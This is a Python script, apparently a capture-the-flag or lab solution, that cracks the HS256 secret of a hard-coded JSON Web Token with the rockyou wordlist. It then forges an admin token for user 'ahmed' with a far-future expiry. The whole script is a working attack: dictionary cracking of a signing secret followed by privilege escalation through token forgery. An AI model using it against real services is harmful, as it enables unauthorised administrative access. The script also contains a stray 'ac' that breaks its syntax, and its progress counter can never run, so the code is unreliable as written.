import jwt
import sys

def crack_jwt(token, wordlist_path):
    """
    Crack JWT secret using a wordlist
    """
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line in f:
                secret = line.strip()
                if not secret:
                    continue
                
                try:
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    print(f"[+] FOUND SECRET: {secret}")
                    print(f"[+] Decoded payload: {decoded}")
                    return secret
                except jwt.InvalidSignatureError:
                    continue
                except jwt.ExpiredSignatureError:
                    print(f"[+] FOUND SECRET (expired token): {secret}")
                    return secret
                except Exception as e:
                    continue

                if f.tell() % 100000 == 0:
                    print(f"Tried {f.tell()} secrets...")
                    
    except FileNotFoundError:
        print(f"Error: Wordlist file {wordlist_path} not found")
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None
    
    print("[-] Secret not found in wordlist")
    return None

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWhtZWQiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc1NjEyMzQyOH0.ncyQImYdHyte3snbdnK47_7o43cYLtzJyKwF1Bbbx5U'

wordlist_path = '/usr/share/wordlists/rockyou.txt'

print("Starting JWT secret cracking...")
print(f"Token: {token}")
print(f"Using wordlist: {wordlist_path}")
print("-" * 50)ac

found_secret = crack_jwt(token, wordlist_path)

if found_secret:
    print("\n[SUCCESS] Use this secret to create admin tokens!")
    print(f"Secret: {found_secret}")
    try:
        admin_payload = {"user": "ahmed", "admin": True, "exp": 9999999999}
        admin_token = jwt.encode(admin_payload, found_secret, algorithm="HS256")
        print(f"\nAdmin token: {admin_token}")
    except Exception as e:
        print(f"Error creating admin token: {e}")
else:
    print("\n[FAILED] Secret not found")
